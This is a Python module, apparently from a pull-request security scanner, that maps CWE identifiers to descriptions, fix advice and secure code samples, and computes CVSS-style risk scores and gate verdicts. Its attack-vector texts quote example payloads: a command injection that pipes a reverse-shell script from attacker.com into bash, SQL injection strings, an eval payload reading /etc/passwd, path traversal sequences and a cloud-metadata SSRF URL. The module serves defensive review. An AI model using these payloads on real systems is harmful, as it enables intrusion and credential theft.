"""Risk scoring, verdict determination, and fix recommendations."""

from typing import Any, Optional

SEVERITY_POINTS = {
    "critical": 35,
    "high": 25,
    "medium": 15,
    "low": 5,
}

FIX_TEMPLATES = {
    "CWE-94": "Replace eval() / exec() with safe parsers (e.g., JSON.parse() or ast.literal_eval).",
    "CWE-89": "Use parameterized queries or prepared statements instead of string concatenation.",
    "CWE-78": "Avoid shell=True; pass arguments as an explicit sequence to subprocess.run().",
    "CWE-328": "Replace MD5/SHA-1 with SHA-256 for integrity or bcrypt/argon2 for password hashing.",
    "CWE-798": "Store credentials in environment variables or a secrets manager, never hardcoded in source.",
    "CWE-22": "Validate paths using os.path.realpath() and verify prefix matches the allowed directory.",
    "CWE-918": "Validate target URLs against a strict allowlist and block internal IP addresses (RFC 1918).",
}

CWE_DETAILS: dict[str, dict[str, Any]] = {
    "CWE-78": {
        "name": "OS Command Injection via subprocess/shell",
        "full_name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "owasp": "A03:2021 – Injection",
        "cwe_url": "https://cwe.mitre.org/data/definitions/78.html",
        "description": "Constructing OS commands with user-influenced arguments without neutralization allows attackers to execute arbitrary system commands on the host operating system.",
        "attack_vector": (
            "An adversary can supply shell metacharacters (such as `;`, `&&`, `||`, `|`, `` ` ``, `$()`) inside input parameters. "
            "For example, providing `127.0.0.1; curl -s http://attacker.com/revshell.sh | bash`. "
            "Because `shell=True` spawns an intermediate system shell (`/bin/sh` or `cmd.exe`), these metacharacters act as command separators "
            "and execute arbitrary commands with the privileges of the application process."
        ),
        "impact": "Complete host takeover, arbitrary command execution, unauthorized filesystem access, and environment variable/secret exfiltration.",
        "remediation_points": [
            "Never use `shell=True` when invoking external processes with dynamic parameters.",
            "Pass command arguments as an explicit list of strings to `subprocess.run()`, which invokes the binary directly without shell interpretation.",
            "Validate all inputs against a strict allowlist (e.g., validate IP format with Python's standard `ipaddress` module or alphanumeric regex).",
        ],
        "secure_example": (
            "# ❌ Vulnerable (Current Implementation):\n"
            "# cmd = subprocess.check_output(f'ping -c 1 {target_host}', shell=True)\n\n"
            "# ✅ Secure Alternative (Argument list + Input validation):\n"
            "import ipaddress\n"
            "import subprocess\n\n"
            "try:\n"
            "    ipaddress.ip_address(target_host)  # Validate IP format strictly\n"
            "except ValueError:\n"
            "    raise ValueError('Invalid host IP address provided')\n\n"
            "result = subprocess.run(\n"
            "    ['ping', '-c', '1', target_host],\n"
            "    capture_output=True,\n"
            "    text=True,\n"
            "    check=True,\n"
            "    timeout=5,\n"
            ")"
        ),
    },
    "CWE-89": {
        "name": "SQL Injection via String Concatenation",
        "full_name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "owasp": "A03:2021 – Injection",
        "cwe_url": "https://cwe.mitre.org/data/definitions/89.html",
        "description": "Building SQL queries by concatenating raw strings or formatting values directly allows attackers to manipulate query logic and bypass security controls.",
        "attack_vector": (
            "An attacker injects SQL control characters (such as `'`, `\"`, `--`, `/*`, or `OR 1=1`). "
            "For example, passing `' OR '1'='1' --` alters authentication logic to log in as admin, "
            "or using `UNION SELECT username, password_hash FROM users --` to dump confidential tables."
        ),
        "impact": "Full database read/write access, authentication bypass, data tampering or deletion, and potential remote command execution via database extensions.",
        "remediation_points": [
            "Always use parameterized queries or prepared statements with placeholder tokens (`%s`, `?`, or `$1`).",
            "Leverage established ORM/query builders (e.g. SQLAlchemy, Prisma) that automatically parameterize inputs.",
            "Enforce least-privilege database user permissions for application connections.",
        ],
        "secure_example": (
            "# ❌ Vulnerable (String Concatenation):\n"
            "# cursor.execute('SELECT * FROM users WHERE username = \\'' + username + '\\'')\n\n"
            "# ✅ Secure Alternative (Parameterized Prepared Statement):\n"
            "cursor.execute(\n"
            "    'SELECT id, username, email FROM users WHERE username = %s',\n"
            "    (username,)\n"
            ")\n"
            "# OR using SQLAlchemy Core / ORM:\n"
            "# stmt = select(User).where(User.username == username)"
        ),
    },
    "CWE-94": {
        "name": "Code Injection via eval()",
        "full_name": "Improper Control of Generation of Code ('Code Injection')",
        "owasp": "A03:2021 – Injection",
        "cwe_url": "https://cwe.mitre.org/data/definitions/94.html",
        "description": "Dynamic code evaluation functions (`eval()`, `exec()`, `new Function()`) execute arbitrary strings as program instructions with full runtime permissions.",
        "attack_vector": (
            "Passing untrusted input to `eval()` allows attackers to break out of expressions and execute arbitrary Python builtins. "
            "For instance, injecting `__import__('os').system('cat /etc/passwd')` or `__import__('subprocess').getoutput('id')` "
            "results in instant remote code execution."
        ),
        "impact": "Arbitrary code execution under application process privileges, memory inspection, persistent backdoor creation, and credential harvesting.",
        "remediation_points": [
            "Eliminate all use of `eval()` and `exec()`. There are virtually no valid production use cases for dynamic string code evaluation.",
            "For JSON or structured configurations, use `json.loads()`.",
            "For Python literal data (strings, numbers, dicts, lists, booleans), use `ast.literal_eval()`.",
            "For mathematical calculations, use dedicated safe parsers (e.g., custom AST allowlists or `numexpr`).",
        ],
        "secure_example": (
            "# ❌ Vulnerable (Dynamic execution):\n"
            "# result = eval(f'2 + {untrusted_expr}')\n\n"
            "# ✅ Secure Alternative (Safe literal or JSON parsing):\n"
            "import ast\n"
            "import json\n\n"
            "# For JSON payloads:\n"
            "safe_data = json.loads(user_input)\n\n"
            "# For Python literal values:\n"
            "safe_val = ast.literal_eval(user_input)"
        ),
    },
    "CWE-328": {
        "name": "Weak Hashing Algorithm",
        "full_name": "Use of Weak Hash",
        "owasp": "A02:2021 – Cryptographic Failures",
        "cwe_url": "https://cwe.mitre.org/data/definitions/328.html",
        "description": "Using deprecated cryptographic hashing algorithms (such as MD5 or SHA-1) exposes systems to collision attacks, pre-image attacks, and rapid brute-force cracking.",
        "attack_vector": (
            "MD5 and SHA-1 have known practical collision vulnerabilities (e.g., SHAttered). "
            "Attackers can construct two distinct inputs yielding identical checksums to bypass file integrity checks. "
            "When used for passwords, MD5/SHA-1 can be cracked in seconds using precomputed rainbow tables or GPU-accelerated hashcat attacks."
        ),
        "impact": "Compromised integrity verification, digital signature forgery, and trivial credential cracking.",
        "remediation_points": [
            "For message integrity, checksums, and token hashing: use SHA-256 (`hashlib.sha256()`) or SHA-512.",
            "For user passwords: NEVER use fast general-purpose hashes. Use adaptive salted key-derivation algorithms such as Argon2id, bcrypt, or PBKDF2.",
            "For HMAC / signatures: use HMAC-SHA256 (`hmac.new(..., hashlib.sha256)`).",
        ],
        "secure_example": (
            "# ❌ Vulnerable (Broken MD5/SHA1 hash):\n"
            "# digest = hashlib.md5(data.encode()).hexdigest()\n\n"
            "# ✅ Secure Alternative (SHA-256 for data checksums):\n"
            "import hashlib\n"
            "digest = hashlib.sha256(data.encode('utf-8')).hexdigest()\n\n"
            "# ✅ Secure Alternative (Argon2id for passwords):\n"
            "from argon2 import PasswordHasher\n"
            "ph = PasswordHasher()\n"
            "hash_value = ph.hash('user_password')"
        ),
    },
    "CWE-798": {
        "name": "Hardcoded Credential / Secret",
        "full_name": "Use of Hard-coded Credentials",
        "owasp": "A07:2021 – Identification and Authentication Failures",
        "cwe_url": "https://cwe.mitre.org/data/definitions/798.html",
        "description": "Hardcoding API keys, private tokens, passwords, or encryption keys directly into repository source code exposes credentials to anyone with access to Git history.",
        "attack_vector": (
            "Source code repositories are cloned across developer workstations, build servers, and third-party CI systems. "
            "Committing secrets allows automated crawlers or unauthorized personnel to extract credentials and compromise backend services."
        ),
        "impact": "Account takeover, unauthorized cloud API usage, database tampering, and infrastructure compromise.",
        "remediation_points": [
            "Extract all credentials and sensitive tokens into environment variables or secrets managers (e.g., AWS Secrets Manager, HashiCorp Vault).",
            "Use `.env` files for local development and ensure `.env` is listed in `.gitignore`.",
            "Immediately revoke and rotate any credential that was ever committed to version control.",
        ],
        "secure_example": (
            "# ❌ Vulnerable (Hardcoded secret in source):\n"
            "# API_KEY = 'sk_live_1234567890abcdef'\n\n"
            "# ✅ Secure Alternative (Environment variable with validation):\n"
            "import os\n"
            "API_KEY = os.environ.get('STRIPE_API_KEY')\n"
            "if not API_KEY:\n"
            "    raise RuntimeError('STRIPE_API_KEY environment variable is required')"
        ),
    },
    "CWE-22": {
        "name": "Path Traversal via Unsafe File Access",
        "full_name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "owasp": "A01:2021 – Broken Access Control",
        "cwe_url": "https://cwe.mitre.org/data/definitions/22.html",
        "description": "Using unvalidated user input to resolve file paths allows attackers to break out of intended directories and access arbitrary system files.",
        "attack_vector": (
            "An attacker supplies path traversal sequences like `../../../../etc/passwd` or `..\\..\\windows\\win.ini` "
            "to escape the application upload/storage root and access sensitive host files."
        ),
        "impact": "Arbitrary file disclosure, source code theft, private key compromise, and potential arbitrary file overwrite.",
        "remediation_points": [
            "Resolve absolute paths using `os.path.realpath()` or `pathlib.Path.resolve()`.",
            "Verify that the canonical path strictly starts with the designated base directory.",
            "Store files using generated UUIDs rather than untrusted client-supplied filenames.",
        ],
        "secure_example": (
            "# ❌ Vulnerable:\n"
            "# with open(os.path.join(UPLOAD_DIR, user_filename), 'rb') as f: ...\n\n"
            "# ✅ Secure Alternative (Canonical path validation):\n"
            "import os\n"
            "base_dir = os.path.realpath(UPLOAD_DIR)\n"
            "target_path = os.path.realpath(os.path.join(base_dir, user_filename))\n"
            "if not target_path.startswith(base_dir + os.sep):\n"
            "    raise PermissionError('Path traversal attempt detected')\n"
            "with open(target_path, 'rb') as f:\n"
            "    data = f.read()"
        ),
    },
    "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "full_name": "Server-Side Request Forgery (SSRF)",
        "owasp": "A10:2021 – Server-Side Request Forgery (SSRF)",
        "cwe_url": "https://cwe.mitre.org/data/definitions/918.html",
        "description": "Allowing user input to determine outbound HTTP request destinations enables attackers to coerce backend servers into reaching internal or cloud metadata services.",
        "attack_vector": (
            "An attacker provides internal URLs such as `http://169.254.169.254/latest/meta-data/` (cloud metadata service) "
            "or `http://127.0.0.1:8000/internal-api` to extract cloud instance IAM credentials or pivot across private VPC networks."
        ),
        "impact": "Cloud credential theft, internal service port scanning, and unauthorized access to unauthenticated backend microservices.",
        "remediation_points": [
            "Enforce a strict domain allowlist for outbound HTTP requests.",
            "Resolve target hostnames to IP addresses and block private/loopback CIDR blocks (RFC 1918, RFC 3927).",
            "Disable automatic HTTP redirects or re-validate redirect destination IPs.",
        ],
        "secure_example": (
            "# ❌ Vulnerable:\n"
            "# requests.get(user_url)\n\n"
            "# ✅ Secure Alternative (Domain allowlist + IP validation):\n"
            "import ipaddress\n"
            "import socket\n"
            "from urllib.parse import urlparse\n\n"
            "ALLOWED_DOMAINS = {'api.example.com', 'hooks.slack.com'}\n"
            "parsed = urlparse(user_url)\n"
            "if parsed.hostname not in ALLOWED_DOMAINS:\n"
            "    raise ValueError('Target domain not allowed')\n"
            "ip = socket.gethostbyname(parsed.hostname)\n"
            "if ipaddress.ip_address(ip).is_private or ipaddress.ip_address(ip).is_loopback:\n"
            "    raise ValueError('Internal network access prohibited')"
        ),
    },
}


CVSS_BASE_SCORES: dict[str, float] = {
    "CWE-78": 9.80,   # OS Command Injection (Critical)
    "CWE-89": 9.40,   # SQL Injection (Critical)
    "CWE-94": 9.80,   # Code Injection via eval (Critical)
    "CWE-798": 8.90,  # Hardcoded Secrets (High/Critical)
    "CWE-918": 8.60,  # SSRF (High)
    "CWE-502": 8.80,  # Insecure Deserialization (High)
    "CWE-22": 7.50,   # Path Traversal (High)
    "CWE-328": 7.50,  # Weak Hashing (High)
    "CWE-352": 6.50,  # CSRF (Medium)
    "CWE-79": 6.10,   # XSS (Medium)
}

DEFAULT_SEVERITY_CVSS: dict[str, float] = {
    "critical": 9.20,
    "high": 7.80,
    "medium": 5.40,
    "low": 2.54,
}


def get_finding_cvss(finding: dict[str, Any]) -> float:
    """Return realistic CVSS base score (0.0 - 10.0) for a security finding."""
    cwe = finding.get("cwe_id", "")
    if cwe in CVSS_BASE_SCORES:
        return CVSS_BASE_SCORES[cwe]
    sev = str(finding.get("severity", "medium")).lower()
    return DEFAULT_SEVERITY_CVSS.get(sev, 5.0)


def calculate_risk_score(findings: list[dict[str, Any]]) -> float:
    """Calculate realistic composite CVSS risk score from 0.00 to 10.00.

    Produces realistic scores with two decimals (e.g. 9.06, 8.76, 2.54).
    Uses maximum-severity anchoring with diminishing marginal compounding.
    """
    if not findings:
        return 0.0

    scores = sorted([get_finding_cvss(f) for f in findings], reverse=True)
    max_score = scores[0]

    if len(scores) == 1:
        return round(max_score, 2)

    # Multi-finding compounding model:
    # Additional vulnerabilities compound risk into the remaining headroom up to 10.0
    compounding = 1.0
    for s in scores[1:]:
        compounding *= (1.0 - (s / 35.0))
    marginal_factor = 1.0 - compounding

    composite = max_score + ((10.0 - max_score) * 0.75 * marginal_factor)
    return round(min(composite, 10.0), 2)


def decide_verdict(risk_score: float) -> str:
    """Map CVSS risk score to PR gate verdict."""
    if risk_score >= 7.00:
        return "REQUEST_CHANGES"
    if risk_score >= 4.00:
        return "WARNING"
    return "APPROVE"


def get_cwe_details(cwe_id: str) -> Optional[dict[str, Any]]:
    """Return enriched vulnerability metadata for a given CWE ID."""
    return CWE_DETAILS.get(cwe_id)


def get_suggested_fix(cwe_id: str, guidance: str = "") -> str:
    if cwe_id in FIX_TEMPLATES:
        base = FIX_TEMPLATES[cwe_id]
        return f"{base}\nOWASP Guidance: {guidance}" if guidance else base
    return "Sanitize and validate all user inputs before passing to sensitive operations."
